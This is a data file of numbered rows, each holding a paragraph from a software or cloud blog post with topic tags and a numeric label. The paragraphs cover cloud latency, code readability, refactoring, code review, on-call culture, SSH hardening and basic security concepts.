1455,We also measured the inter-cloud-provider ping RTTs between all the 29 AWS and Google data centers. The heat-map for these measurements is presented in Fig. Interestingly the RTTs between some subsets of a mixture of AWS and Google regions in the same geographical areas are extremely low (see the European data centers in Fig. A user looking for extremely high-levels of availability may want to consider using both the cloud providers to get the extra redundancy (we think that Google cloud and AWS data centers share very little!,"['Cloud Computing', 'AWS', 'Google Cloud Platform', 'Azure']",11
1456,"Here are the results: The darker the shade of the heat-map entry, the better (lesser) the TCP connection time. The absolute values of the connection times are also noted on the heat-map. The connection time from a region to all other regions can be read off the heat-map by looking at its row and and the corresponding destination region column. The heat-map reveals that each Azure region has at least one neighboring region with very low TCP connection latency (except the Brazil South region). This makes Azure a desirable destination for enterprises looking to build highly-available IT solutions across different geographies. There are no orphan regions as was the case with Google Cloud and Amazon AWS.","['Cloud Computing', 'AWS', 'Google Cloud Platform', 'Azure']",11
1457,"We do have a hypothesis on why Microsoft chose to build out so many regions: Microsofts flagship product Office 365is a key use case for Azure data centers. Given its latency-sensitive nature, Microsoft may have decided to put down data-centers in many more geographies. Even if the demand for the Azure product is not strong in a particular region, local Office 365 subscribers will appreciate snappier Office performance! Cloud providers have gone to great lengths to solve the high latency issues of remote data centers by building dozens of global regions for their world-wide client base. Some of these regions have very low inter-region RTTs and can be harnessed to create cross-region highly available IT solutions. However, many regions outside the western world suffer from relatively poor connectivity to other regions. *Sachin Agarwal is a computer systems researcher and the founder of Big Bit Bus. Big Bit Bus is on a mission to bring greater transparency in public cloud and managed big data and analytics services.","['Cloud Computing', 'AWS', 'Google Cloud Platform', 'Azure']",10
1458,"As the problems get messier and more complex, it can help to centralize this process in a single long-running document. Its a great scratch space for thinking through future experiments and making sure others can follow along with your thought process while youre at it. My rough format: Whats the big idea? (add historical context, frame the opportunity)Who are the owners this project(s)? (clear ownership helps avoid death by analysis and offers clear points of contact)Whats my best guess at the right answer? (doesnt have to be correct in hindsight, just has to be a useful, opinionated stance that implies action)What experiments have we already done in this effort? What did we learn from them? What is the next, most valuable experiment we should try? The ability to take on a vague project of potentially massive scope without succumbing to a blind guesswork is quite challenging. But on the upside, its also a rare skill that youll use more and more as you become a more senior technical leader.","['Engineering', 'Decision Making', 'Coding', 'Leadership', 'Serverless']",4
1459,"Unreadable code reads like a novel trying to pass itself off as code. Files packed with text, to be read in sequential order. Cleverness for the sake of being clever. The code is trying to be readable, but its targeting the wrong kind of readers.",[''],9
1460,"Is code readable when it looks pretty? Looking pretty is a nice side effect of readability, but its not that useful. Maybe on the margins, it helps with employee retention. But so does a good dental plan. Plus, everyone has a different opinion of what looks pretty. Soon enough, this definition of readability spirals into a vortex of tabs, spaces, braces, camel casing, and the other formatting holy wars. No one will faint upon seeing misaligned arguments, despite the attention they attract during code review.",[''],9
1461,"Instead, lets look at readability through the lens of interface design. Our lives are filled with interfaces, digital and otherwise. A toy has features that make it roll or squeak. A door has an interface that lets it open, close, and lock. A book arranges data in pages, allowing for faster random access than a scroll. Formal design training tells us even more about these interfaces; ask your design team for more information. Failing that, weve all used good interfaces, even if we dont always know what makes them good.",[''],12
1462,"If were supporting search, were going to need some SEO. Expressive variable names come in here. If the user cant find a feature by moving up the callstack from a known point, they can start typing keywords into search. Now, not every name needs to have every keyword. When our users search for code, they only need to find a single entry point and can work outward from there. We need to get them close to where they want to be. Include too many keywords, and theyll be frustrated by noisy search results.",[''],19
1463,"For the second condition, different users have different strategies. In low-risk situations, comments or method names may be sufficient proof. For riskier, more complicated areas, or when users have been burned by stale comments, theyre likely to be ignored. Sometimes, even method and variable names will be met with skepticism. When this happens, the user has to read much more of the code and hold a larger model of the logic in their head. Small, easy-to-grasp contexts come to the rescue again. If the user can immediately convince themselves that this level of logic is correct, theyre able to forget all previous layers of abstraction, freeing up mental space for subsequent layers.",[''],9
1464,"When the user is in this mode, individual tokens start to matter more. An element.visible = true/false bool flag is easy to parse in isolation, but it requires mentally combining two different tokens. If instead, the flag is element.visibility =.visible/.hidden, contexts involving the flag can be skimmed, without having to read the name of the variable to find out that its about visibility. Weve seen the same design improvements in customer-facing UIs. Over the past couple of decades, confirmation buttons have evolved from OK/Cancel to more descriptive options like Save/Discard or Send/Keep Editing. The user can figure out whats going on by looking at the options themselves, rather than needing to read the whole context.",[''],15
1465,"To get the fastest turnaround time, we use compiler errors. These rarely require a full build and may even appear in real time. How do we take advantage of them? Broadly, we want to look for situations where the compiler gets very strict. For example, most compilers dont care if an if statement is exhaustive, but will carefully check switch statements for any missing cases. If a user is trying to add or edit a case, theyre safer if all the previous conditionals were exhaustive switches. The moment they change the cases, the compiler will flag all the conditionals they need to reexamine.",[''],9
1466,"Another common readability problem is using primitives in conditionals. Especially when an application parses JSON, its tempting to write lots of if-statements around string or integer equality. Not only does this open the door for misspellings, but it also makes it challenging for users to know which values are possible. Theres a big difference between having to check the edge cases when every string is possible and checking the edge cases when two-three discrete cases are possible. Even if primitives are captured in constants, the user is one impending deadline away from assigning an arbitrary value. If we use custom objects or enums, the compiler blocks invalid arguments and provides a clear list of valid ones.",[''],9
1467,"Similarly, prefer a single enum over multiple bool flags if some flag combinations are invalid. For example, imagine a song that can be buffering, fully loaded, or playing. If we represent that as two bool flags, (loaded, playing), the compiler permits the invalid input (loaded: false, playing: true). However, if we use an enum,.buffering/.loaded/.playing, the invalid state is not even possible. Disable invalid combinations of settings would be a basic feature in a customer-facing UI. But when were writing the code inside the app, we often forget to grant ourselves the same protection.",[''],9
1468,"Paradoxically, trying to build it allto emulate our heroes on day oneis more likely to be disastrous. In Malcolm Gladwells re-examining of the story of David and Goliath, David refuses to put on the heavy battle armour of professional soldiers, preferring to fight with only a shepherds sling. David knew he couldnt bear the weight of the armour and wouldnt be at his best, potentially putting himself in even greater danger. As Malcolm Gladwell paraphrases it, ""I've never worn armor before. ""Google is 20 years old, yet Google Cloud is only just starting to challenge AWS. Google boasts impressive infrastructure, tens of billions invested, including undersea cables and a global network estimated to carry 25% of the worlds Internet traffic. Only now are they offering this through Google Cloud. This is a far cry from the humble beginnings of 1998, when Google was an underdog search-engine beloved of 90s hipster-equivalents.20 years is a long time. Long enough to accumulate extraordinary experience, infrastructure and legacy. A long road with plenty of twists and turns along the way. I dont know specifics, but I do know what life is like. Success is a messy business, exploratory, trying, failing, scratching your head, learning something new, trying to think different.","['Digital Transformation', 'Technology', 'Technology And Design', 'Scaleup']",16
1469,"What if youd like to become more proficient at refactoring? Set a goal like: Use Extract Method to remediate a Long Method code smell. Then find some code that offers an opportunity to practice doing that, like the Gilded Rose refactoring kata. Then, practice a specific sequence of refactorings again and again until it becomes second-nature to you. If one hour isnt sufficient for that, then do it again another day. When you feel confident in the skill, find another chunk of code and repeat the exercise.","['Software Development', 'Agile', 'Agile Transformation', 'Coding', 'Scrum']",9
1470,"What if youd like to become more proficient at functional style programming in Java? Set a goal like: Convert a loop into the equivalent functional-style code. Look for or write some code that can support that goal. Heres an article about Java 8 idioms. Consider the examples under the subheading, The power of function composition. You could convert that code snippet manually, over and over again, without referring to the solution after the first attempt. If that doesnt make it second-nature, then do it again another day. Pick another example thats somewhat different, and practice converting it.","['Software Development', 'Agile', 'Agile Transformation', 'Coding', 'Scrum']",9
1471,"Resources:- It also matters what kind of engineers and resources you have if most of the engineers are technically good and can code then you must not invest in making framework code less. If your team has few manual engineers whore not families about coding then you need to implement a framework that supports test case writing without knowing much of the code ex. cucumber/gauge Time: Amount of time is also an important factor as if you want to develop a framework in very less time you should expect more support from a framework and less from our side ex. QTP/UFTBudget:- In todays era open source tools and taking most of the market because these tools getting powerful day by day. So I would prefer to go for opensource tools like Selenium for UI, Rest-assured for API, But sometimes you need to go for paid tools for testing BIG Data products where you need perform testing with different situations.5. Ease Of Adoption:- Ease of support is a most important factor because if you stacked somewhere you should get response/resolution for your support as early as possible to meet business deliverable.6. Easy to Fix issues[Logging/Reporting]:- In my view if you are spending more time on finding where the test case is failed then writing it that means you have a serious issue of framework reporting. Framework reporting should be in such way failures can be identified very quickly.7. Reporting:- In continues delivery we keep eye on execution report only, So we should have very good automation reporting like extents report or jasmine specs reports etc. A report should be readable by the non-technical person with proper description.","['Software Testing', 'Automation Testing', 'Automation Tools']",12
1472,"I was shocked, like everyone else, to see it at the center of an international meltdown of unprecedented proportions. Over two hundred thousand businesses stymied? The malware takes advantage of a previously undiscovered bug in the SMB protocol to take over a computer, encrypts all the files, and puts up a message telling the owner to pay up or lose their data. The NSA had known about the bug for years but didnt disclose its existence so it could be used as an espionage weapon. It was only discovered in the wild a few months ago when a group called the Shadow Brokers leaked a ton of NSA documents through Wiki Leaks.","['Security', 'Ransomware', 'Enterprise Software', 'Cloud Computing', 'SaaS']",16
1473,"So the hackers will keep finding the bugs, knowing that inertia is in their favor. And they will hide it from othersso they can weaponize it, so they can monetize it, so they can benefit from it. And we are all in denial of it. The motiveindustrial, government, or criminal espionageis almost secondary in nature.","['Security', 'Ransomware', 'Enterprise Software', 'Cloud Computing', 'SaaS']",16
1474,"We can sit here and blame Microsoft but that would be a mistake. Its true that every one of the thousands of eyeballs that looked at that particular piece of code didnt notice that it would misbehave in a peculiar way when handed parameters that it was never designed to handle. Some smart kid somewhere figured it out and it became weaponized. Trust me, there are many other such pieces of code out there. You and I and the rest of the world will pay the price for the next two decades, guaranteed. Thats how long it takes to replace these systems in regulated industries.","['Security', 'Ransomware', 'Enterprise Software', 'Cloud Computing', 'SaaS']",16
1475,"Some NIH will give your best staff something to really get their teeth into. A chance to contribute something original. An incentive to remain at your company. Under which conditions should we allow original and innovative projects to occur? There are some areas of the computing industry working up against the cutting edge on tough, innovative problems. Consider the current race to produce the best hardware to support the needs of machine learning at scale, and the software frameworks being written to best utilize that compute power.","['Software Development', 'Management', 'Startup', 'SaaS', 'Leadership']",12
1476,"Coming from being a code monkey on Wall Street trading desks, I recall the culture shock during code reviews in my first job in Silicon Valley. Why are we nitpicking indentation and variable names? Who gives a sh*t about being Pythonic? Is a LGTM from me, to me not enough? Four years later, Im fully adjusted. I get that having code reviews probably is a sensible idea. This article wont debate the merits of code review culture, nor recommend tooling of any kind. Instead, I will focus on human aspects to sustainably getting to ship it!",['Code Review'],9
1477,"Obviously, spamming this strategy to deflect every suggestion wont make you popular. When appropriately used however, this is graceful way to break an impasse for all parties. The reviewer feels like his smart idea is acknowledged (and credited in the TODO); you get to ship; users get value now. Perhaps you made a conscious coding decision to take certain shortcuts rather than reach for perfection. Write a comment right then and there! Explain the justifications and preemptively add a TODO. This saves time during code review, and lets reviewers (and maintainers) know that you were thoughtful and deliberate about your code.",['Code Review'],13
1478,"Suppose you agree with a suggestion for a big improvement, but it involves lots of additional code. Should you do it right now? If the baseline code is functional and correct, it might not be a good idea. Other reviewers might have already spent time reviewing and are satisfied with the baseline code. In your subconscious rush to rewrite the algorithm and inject more code, whats to say that no new bugs are introduced? If there is no obvious harm done to push the code as is, then just do so.",['Code Review'],13
1479,"Because of that, I decided I would devote this post defining a couple of these new phrases for you in a safe environment. That way you dont have to admit you feel like an imposter. (I want to emphasize, it is ok to feel like an imposter. Its something that never goes away. With a field that grows and changes as fast as this one does, you will never arrive and be all knowing. One of the biggest differences between green developers and seasoned ones are that they are willing to admit that they dont know something and are willing to ask What is that? The sooner you learn to get over that imposter feeling, the more quickly you will improve as a developer. )NO-OP: A no-op means No Operation and means probably what you think it means, it does nothing. It used when you write code that intentionally does nothing. The first time I heard this, it went something like this. Unfortunately, the API required me to pass in a function, so I passed in a no-op. I was just sitting back thinking, Oh this must be some crazy functional programming jargon like a monad. This is way above what I can understand right now. I was almost a little disappointed to learn what it really meant.","['Software Development', 'Jargon', 'Junior Developer', 'Buzz Words', 'New Developer']",12
1480,"WIP Commit: You may also hear commit that as a wip or something similar. When I first hear this, my knowledge of git commands were: git add., git commit -m, and git push origin master. In fact that was usually what I did every time. So I just assumed it was some sort of git command that I hadnt learned yet. After searching for how to use git whip I eventually learned it that a it wasnt whip, its wip and it stands for Work In Process. Sometimes you just need save your changes in its current state and the current state is not finished, its a well you know.","['Software Development', 'Jargon', 'Junior Developer', 'Buzz Words', 'New Developer']",18
1481,"Talking to a rubber duck: Also called, rubber duck debugging, this is processes of talking through the code, bug, or whatever out loud. By describing the problem out loud, it forces you to stay focused and often times you find the solution on your own by talking through it. This process was made famous from an influential book called The Pragmatic Programmer where a programmer kept a rubber duck with him to talk to it, which would help him think through the problem and solution much easier. As a green developer, I would often times hear things like, Can you be my rubber duck for a moment? or Thanks for being my rubber duck. Essentially, what is being said is Can I talk through this problem out loud with you? I dont expect/need you to help me get the answer, I just want to talk through the issue.","['Software Development', 'Jargon', 'Junior Developer', 'Buzz Words', 'New Developer']",4
1482,"Uncle Bob: Speaking of influential writings, another pair of influential writings in the developer world are The Agile Manifesto and Clean Code: A Handbook of Agile Software Craftsmanship. Robert C. Martin authored or co-authored both of them. Both are extremely influential writings on what makes code clean and easy to maintain. The reason I put it here is that, when I was new, I would hear people talk about Uncle Bob like he was Jesus and/or Satan. I would hear things like, This code would make Uncle Bob proud or Uncle Bob wouldnt like this, but Im doing it anyway. What was really being said was that Im proud of my code and how clean it is or I know this doesnt follow principals of clean code, but I have reasons why. He refers to himself as Uncle Bob and even his consulting company is named Uncle Bob. Why did he chose to refer to himself as Uncle Bob? I could not find an answer that was from a trusted source, so I decided not to speculate.","['Software Development', 'Jargon', 'Junior Developer', 'Buzz Words', 'New Developer']",9
1483,"It is surprising to me how many development organizations dont view bug tracking software as an indicator that there is a problem with their development practices. I am a firm believer that the need for a bug tracking system is problematic. It should be the topic of team retrospectives, and teams should strive to iterate over their codebase and their practices until there is no need for a bug tracking system. Given the current state of your organization, you may not be able to stop using a bug tracker until you reduce your backlog. But working towards getting rid of it will pay huge dividends for the quality of your codebase, development practices, and the product you are building.","['Software Development', 'Agile', 'Extreme Programming', 'Tdd', 'Software Engineering']",13
1484,"Ive heard Uncle Bob Martin discuss this several times when Ive had the pleasure to see him talk. It is also one of the tenets of e Xtreme Programming: No Bugs. Details about the XP practices that support No Bugs can be found in James Shores book, The Art of Agile Development. In fact that book will provide significantly more detail than I will describe here. The recommendations Im making are really restating suggestions from his book since my team worked closely with James to improve our development practices.","['Software Development', 'Agile', 'Extreme Programming', 'Tdd', 'Software Engineering']",18
1485,"Dont allow a bug backlog to accumulate. The beauty of this is that there are no bug triage meetings or the need to schedule time for bug fixes. Theres no need to categorize the importance of bugs relative to other bugs. No time spent to determine which release a fix is going to be deployed in. A whole class of time consuming, cross-team coordination efforts and meetings are not needed. In some organizations there are people whose sole purpose is this type of coordination. Additionally, people outside of the cross-functional development team are not making these decisions (as usually happens when you have these processes in place). And by cross-functional development team I mean the folks who are spending their entire workday working closely on that product (Software Engineers, QA Engineers, Product Owners / Product Champions, etc.","['Software Development', 'Agile', 'Extreme Programming', 'Tdd', 'Software Engineering']",13
1486,"This may all seem like Im speaking to you from Programmer Fantasy Land. You may think Im crazy or you may just look at your codebase and think that there is no way to get there from where you are. Ive definitely been in that situation, but consistently making small, incremental steps will get you there. First and foremost if you are in a hole you need to stop digging and start making those changes today! If you still dont believe me check out Jay Bazuzis blog post: Why I Write Horrible Code. There are ways to transform your practices and codebase but it will require work and buy-in from the rest of your team.","['Software Development', 'Agile', 'Extreme Programming', 'Tdd', 'Software Engineering']",9
1487,"Why did I need such air pressure sensor? A few weeks ago, Ariella Eliassaf, Avi Aminov and I took on a challenge and tried to build a robot that plays the trumpet in a weekend makers hackathon called Geekcon. We had some initial success with getting sound out of the trumpet, but had some difficulties obtaining repeatable results. This is not our first time in Geekconlast year we built the Chrome T-Rex game in Real Life, and later were invited to display it in the Chrome Dev Summit. Thus, I was really pumped when I found that the Chrome Dev Summit invited us to present our project again this year: add a MIDI interface to the robot and let the attendees control the robot through the Web MIDI API. In a nutshell, the Web MIDI API allows you to control musical instruments connected to your device. It works on both desktop and Androidmeaning, I could plug any MIDI device through USB and control it directly from the web. You can receive input from a piano keyboard, or send notes to different kind of synthesizers. You can see it in action in this nice demo by Sam Dutton: So we were invited to present the project, great news! However, this also means we need to get the project to work and actually play the trumpet and a reliable and reproducible manner. And this is also where the Air Pressure sensor comes into play: in order to get reproducible results, we need to be able to measure the parameters that affect the sound, including the air pressure that we have in the system.","['Technology', 'Angular', 'Web Development', 'Internet of Things', 'JavaScript']",6
1488,"First, let me describe how our robot works: We have an air pump that is connected to a chamber. The top of the chamber has a small hole drilled in it, and two water-filled latex lips are pressed to it. We press these latex lips against the mouthpiece of the trumpet, and as they pressured air flows through them, it creates a vibration that produces the sound. Our goal is to measure the air pressure inside the chamber. The chamber has to be sealed (otherwise, we wont be able to build the air pressure inside), so we looked for a wireless sensor solution. Fortunately, as you will shortly see, it was pretty easy to build one from scratch, just using off the shelf component.","['Technology', 'Angular', 'Web Development', 'Internet of Things', 'JavaScript']",5
1489,"When I first joined the on-call team at Button, I had a lot of anxiety about getting paged. What if I slept through a page? What does that service even do? Which dashboard am I supposed to be looking at? Since then, Ive been on the rotation for almost a year and have responded to countless pages. While I cannot profess that I enjoy being on-call, I can attest that being a member of the on-call rotation has definitely been a highlight of my role at Buttonin large part due to the support and culture of our on-call team.","['DevOps', 'Engineering', 'Women In Tech', 'Diversity In Tech', 'Engineering Culture']",0
1490,"In operations and engineering, an on-call team is typically responsible for ensuring the reliability and availability of services and applications. There are clear consequences to the businessdirect revenue loss and reputation damageif the on-call team is not set up for success. Whats less visible but just as impactful is the stress and frustrations that an unhealthy on-call culture can breed within an engineering organization. Engineering is as much about maintaining software as it is about building it. Its difficult to build scalable software if you are constantly worried about production outages! An outage at 2:00 am can both be damaging to the company if not handled properly and frustrating and alienating for the individual who must get out of bed to address the related page. It is important for a healthy on-call culture to be mindful of both perspectives. In this blog, I will outline some of the Button on-call teams best practices.","['DevOps', 'Engineering', 'Women In Tech', 'Diversity In Tech', 'Engineering Culture']",0
1491,"Planning a trip with a dockless system is easyfind the nearest bike and ride it to your destination. Dockless systems arent (yet) everywhere, and cities and system operators both set limits on where you are allowed to operate a dockless bike. We call the region where you can use a given companys bike a service area. Some systems dont allow bikes to be left outside this area at all, while others simply charge a high fee for the privilege. So how do you find out what that area is? Sometimes, we can get this data directlyproviders or partners have their own API endpoints that return service areas. While we still need to do some work to merge disconnected areas and associate areas with systems, this is by far the best methodnot only for us, but for cities, too. Chicago is one of the latest US cities to try a dockless pilot, and is requiring vendors to publish data adhering to the GBFS v1.1 (draft) spec. This draft spec adds new data endpoints that provide information about service areas (geofencing zones), including their exact geometry! Making this data available programmatically is beneficial for users, developers, cities, and regulatorsusers want to know theyre leaving bikes in the right places, and cities want to keep their streets and sidewalks (and canals and rivers) open for all users.","['Mobility', 'Bike Sharing', 'Maps', 'Software Development', 'API']",11
1492,"For systems where a few stations are far removed from the majority, we segment those stations into a separate region (and therefore a separate polygon) to ensure the resulting service area doesnt include huge swaths of dock deserts. Adjusting the radius of the buffer is also key; we start with 500mroughly a five-minute walkand tweak as needed to make a shape that covers key areas without overextending. The more geographically-minded among you may wonder how we project that radius evenly across latitudes, and compensate for other quirks of geospatial systems. Well Weve talked about geospatial coordinates and projections before (link), and why we use a projection system known as Web Mercator. In our Web Mercator coordinate system, a single unit in projection space is equal to one meter at the Equator, but shrinks the farther away you get. The southernmost point in the US (in Hawaii) at around 18N has a scale factor of 1.05, the top of the continental US is at 49N with a scale factor of 1.5, while one of the northernmost cities (Fairbanks, Alaska) at around 65N has a scale factor of 2.37! This isnt just a fun fact for trivia nights either; there are bike-share systems in all of these places.","['Mobility', 'Bike Sharing', 'Maps', 'Software Development', 'API']",14
1493,"For example, the government builds dams so that electricity can be produced. Water flows through the wall so that turbines can generate electricity. There is a limit of pressure that the wall can tolerate. If the wall has cracked, it will be its vulnerability. More pressure of water can blow away the wall, so this is a threat.","['Security', 'Vulnerability', 'Computer Networking', 'Computer Science', 'Software Engineering']",5
1494,"You can see CIA triad from different perspectives so that your point of view can get clear about these properties. A scenario may involve interruption, fabrication, interception and modification. An attacker may interrupt your access to files so that he can show you what he wants. He can intercept your messages and emails so that he can know what you are doing. He can modify the information in your emails before sending to receiver.","['Security', 'Vulnerability', 'Computer Networking', 'Computer Science', 'Software Engineering']",11
1495,Another option is to let everything accessible all the time which is completely an unsecured way. You will have zero security and anyone can harm you easily. The best security option lies between high-level security and zero level security. You should be able to use it within the optimized performance range. But there should be restrictions so that the system can maintain its safety level. These restrictions are policies of access control. We make policies about who will access a file and what he can do with it.,"['Security', 'Vulnerability', 'Computer Networking', 'Computer Science', 'Software Engineering']",10
1496,"A vulnerability can be an improper hardware connection or cross coupling. It can an issue in user identification, authentication, modification or subtle software. It can be attachment of recorders so that bugs or any other information can be recorded. A vulnerability can be something done by maintenance man like he disables the hardware devices or uses stand-alone utility programs. It can be a failure of protection circuits or software. Vulnerabilities involve bound control and access control issues. We can not consider that the security relays only on software security or hardware security because the men can also involve in leaking or disabling the various modules so that unauthorized access can be gained.","['Security', 'Vulnerability', 'Computer Networking', 'Computer Science', 'Software Engineering']",16
1497,"With so many people doing work, things are far less stable. A lot of builds are dudstoo many people working too fast and the merge doesnt go quite right, etc. The developers reach out regularly and say Dont touch that! The QA leader suggests that the team create yet another servercalled developmentwhich will be up to them to control. Whenever they are satisfied that all the pieces work, then they can send a complete build to the QA server. There is no point in running a bunch of QA scripts against an app thats known to be broken.","['Continuous Integration', 'Software Development', 'DevOps', 'Development', 'Agile']",13
1498,"I hope new developers gain some insight from this story, and consider how it relates to their current organization and their pain points. Its all connected to the software lifecycle. Fixing the lifecycle and the tools that power it can make a huge impact.","['Continuous Integration', 'Software Development', 'DevOps', 'Development', 'Agile']",12
1499,"Once youve confirmed that your remote account has administrative privileges, log into your remote server with SSH keys, either as root or with an account with sudo privileges. Then, open up the SSH daemon's configuration file:sudo nano /etc/ssh/sshd_config Inside the file, search for a directive called Password Authentication. Uncomment the line and set the value to ""no"". This will disable your ability to log in via SSH using account passwords:/etc/ssh/sshd_config Save and close the file when you are finished by pressing CTRL + X, then Y to confirm saving the file, and finally ENTER to exit nano. To actually implement these changes, we need to restart the sshdservice:sudo systemctl restart ssh As a precaution, open up a new terminal window and test that the SSH service is functioning correctly before closing this session:ssh username@remote_host Once you have verified your SSH service, you can safely close all current server sessions.",['Ssh'],7
1500,"Of course, sticking with the status quo is always an option. (Well, not for me, but maybe for some! )I ended up choosing Option 2. Some may be disappointed, but in reality, this is a side project that I worked on in the evenings and on the weekends. Spending a significant amount of time to build something in App Engine when Forms was 1) free and 2) probably better than what I would come up with was out of the question. Additionally, using the additional services of Pub Sub and Data Flow was pure over engineering for this project. However, since I went thought this exercise, I already have identified a roadmap to scaling if and when the time comes. (Comment below if youd like to see some blogs on that topic. )Some may think that because my architecture does not contain a robust set of products or that since I didnt write dozens and dozens of lines of code makes it irrelevant. Just as data has become democratized in many organizations in the last 10 years, so has the general toolkit to make things happen. Any departmental team in any org (with access to G Suite and GCP) can set up something like I did and get tremendous value with little cost. So, why get upset about that? This doesnt mean that the story ends, though. The final architecture of what I came up with looks different than what I proposed above. This is because we need to talk about managing that data coming from Forms and Sheets into Big Query, the ML models and data sets behind that, and hosting and sharing all of this glorious, delicious content. Many of these concepts will be covered in detail in later blogs, but heres a summary of what I came up with.","['Google Cloud Platform', 'Bigquery', 'G Suite', 'Whiskey']",1
1501,"Some of you that have worked with external table sources in Big Query may know that sometimes this can cause some problems. In my case, I was seeing issues when creating views off of these externally based tables that prevented me from saving the view. If only there was an easy and cheap way to automate some jobs that could write those sheets into a Big Query table Lucky for me, there is a way to do this. I wrote an App Script to query the Sheet-based BQ table and write those results into a new, internal table (which had no problems being used in a view). The cool thing about using App Script is that I can set a timer for these types of scripts and queries to run on a schedule. Mine is set for once a day, but in theory I could have it run every minute or on set days if I wanted to.","['Google Cloud Platform', 'Bigquery', 'G Suite', 'Whiskey']",8
1502,"You may think that there is no way the above solution works. And now, the only thing I worry about is filling out ratings of whiskies, as opposed to worrying about having to update things and run jobs. However, once you start a project like this, there are always enhancements right? Some of you may be wondering how cost effective this was as well. Ill review the GCP related costs here and ignore other items like domain name, Square Space subscription, developer time, etc. But, to develop all of this and basically have it in a prod state was less than $33. Well see how much the costs fluctuate and perhaps Ill post some updates on that in the future, but $33 in cloud costs to develop a pretty simple app that requires basically no maintenance is basically free. Heck, it is free when you factor in that I had a $300 sign up credit from GCP that I used for those $33.","['Google Cloud Platform', 'Bigquery', 'G Suite', 'Whiskey']",6
1503,"Why does i BL need to be involved in this to consult? Users sign on in the clients, not in i BL, so the clients can probably figure out the users' profile without help from i BL. But this is where it stopsthe clients would need to know what a different age group means. They need to know what episodes are promoted, where the promotion comes from, how the promotions are scheduled. Data that is in i BL, data that is part of the cross-platform business logic.","['Product Management', 'Iplayer', 'Cross Platform', 'API', 'Collaboration']",8
1504,"Since this was going to be the first time we are segmenting the audience in i BL, we wanted to keep it fairly basic. Some of the main questions we tried to answer: What is the experience going to be like? How do we curate this new experience? Can we use existing data (e.g. channel, genre, category) to select the content automatically? Can it be semi-automatic where the editorial team can define weightings or priorities? How much effort will this be, both upfront in engineering cost, and to keep it running editorially? What timeline are we operating on? Are there any big events coming up? Are there any big releases coming up? How do we build this thing? Who else do we need to collaborate with in order to deliver this? Does i BL need to do any work, or can the client team deliver this themselves? How do we measure the impact? Whilst we have A/B testing on certain platforms as Andy explained in a previous post, extending this to measure the same thing on all platforms equally is a bit more difficult.","['Product Management', 'Iplayer', 'Cross Platform', 'API', 'Collaboration']",6
1505,One day we decided it had to stop. We carved out proper places for things and organized what we had. We did our best to practice self-discipline to put tools and supplies back in their proper places after each use. Quality and bandwidth to get things done went up. Stress and wasted time and money went down.,"['Software Development', 'Agile', 'Coding', 'Project Management', 'Scrum']",4
1506,"Thats how incremental refactoring works, too. We go into a piece of code to add a new case to a list of conditionals. We see that the list is implemented as a big if/else block. We decide to change it to a switch or case statement in the course of adding the new case. You might argue thats not much better than an if/else block. Youd be right: Its not much better. But it might be a little better. And the next time someone touches that code, they can make it a little better still, because you will have left them at a better starting point.","['Software Development', 'Agile', 'Coding', 'Project Management', 'Scrum']",9
1507,"Maybe we add some functionality to an application, and we notice that a function or method we wrote is very similar to an existing one elsewhere in the code base. It only takes a few seconds to factor that duplication out, even without the conveniences offered by sophisticated IDEs. We can safely refactor because weve also applied the self-discipline to ensure microtests or unit tests cover that functionality, even if we refactor by hand. After all, whats the justification not to do those things? I often hear people say the benefits of refactoring are long term, and while it makes sense in theory, out here in the Real World were always under pressure to deliver on a tight schedule. But when it comes to keeping the code clean as you go by doing small refactorings incrementally, long term means the very next time you touch that part of the code base.","['Software Development', 'Agile', 'Coding', 'Project Management', 'Scrum']",9
1508,"Software engineering can be an absolutely thankless job. Oh sure, it has its perks. You get to be creative and solve problems, and there is a beauty and elegance in well written code sometimes that can be hard to describe to those that dont speak the language. Where we were once portrayed almost universally as pocket-protector-wearing, tape-on-the-glasses nerds, Hollywood now depicts us as elite hackers that can sit down at a never-before-seen terminal and instantly predict the passwords to any government agency in the world, and find a way to copy and then delete their entire database onto a USB drive in under 60 seconds. I dont think I could hack my own laptop let alone anyone elses, and some days it can take me more than a minute just to copy some Word documents to my USB drive.","['Programming', 'Technology', 'Self Improvement', 'Business', 'Productivity']",2
1509,"The reality of being a programmer is a bit less sexy than our Hollywood counterparts however. Our bosses and co-workers dont give a damn about how elegant our code is. They dont understand that we are asked every single day to estimate how long it will take to code features and fixes that we have absolutely no idea about until that very moment. Frankly, were often asked to do things by people that have no idea what they are even asking us to do! Our worth is often measured by our ability to crank out code at a record breaking pace, and our willingness to work insane amounts of hours doing so. Work/life balance can often be non-existent. And as we all know, one aww shit can wipe out volumes of atta-boys. At the end of the day, its your job to produce, and unlike sales-people and executives, going above and beyond doesnt often net you a trip to the Bahamas, a gold watch or a profit-sharing check. In fact, working harder usually only ends up raising others expectations of you, and when you fall short of that new bar you just set, you end up looking and feeling like a slacker.","['Programming', 'Technology', 'Self Improvement', 'Business', 'Productivity']",0
1510,"Why did it take you so long to code that new feature? Why did QA find bugs in your code? And why arent we using <insert latest beta technology here> in our app? Its easy to get defensive when people call our babies ugly, and when our hard work and sacrifice is rewarded with negativity and a lack of appreciation. Even when dealing with team members, sometimes simply pointing out an overlooked issue in code, or requesting a small additional feature can net an aggravated and sometimes accusatory response from the person who coded it. Its not a personal attack however. When the widget doesnt widge, and the foo is missing a bar, its not the fault of the person that found the problem, nor does it constitute an attitude problem on the programmers part. How we respond to the questions and complaints of others, our co-workers and clients alike, will have a huge affect on how our value to the company is perceived, and ultimately, how far we can go in our careers.","['Programming', 'Technology', 'Self Improvement', 'Business', 'Productivity']",13
1511,"What other people do notice however is how you respond to their needs and their efforts. This same premise applies whether we are talking about co-workers, clients or end-users. If you want people to recognize you as a great employee, they first need to experience and appreciate you as a person. No amount of skill or hard work will ever replace that fact. Ive seen some of the worst programmers Ive ever known rise through the ranks of companies, surpassing much more experienced and talented programmers than themselves, based simply on the fact that they know how to get along with others, and how to play the game. Usually, these same people end up becoming leaders and managers while other programmers continue to struggle along in their own personal bubble, wondering where they went wrong and why they didnt get the promotions they felt they deserved.","['Programming', 'Technology', 'Self Improvement', 'Business', 'Productivity']",0
1512,"What I suggest is reading between the lines and seeing things from your bosses point of view. Your boss has likely never had to write code in his/her life, and why it took you so long is not really the question they are asking anyway. What your boss cares about is meeting their deadlines, making the client happy, increasing sales, and making their own boss happy. By caring about what your boss cares about, youll make them happy too. Use your empathy to connect with them and their feelings, and address their needs and goals. For instance In other words, dont make excuses, heck, you dont even really need to explain, what you do need to do however is let them know that you feel and understand their pain, and are focused on the things that they are focused on. Offering a suggestion on how to make things better never hurts either, and takes the pressure off of them to come up with an idea themselves.","['Programming', 'Technology', 'Self Improvement', 'Business', 'Productivity']",0
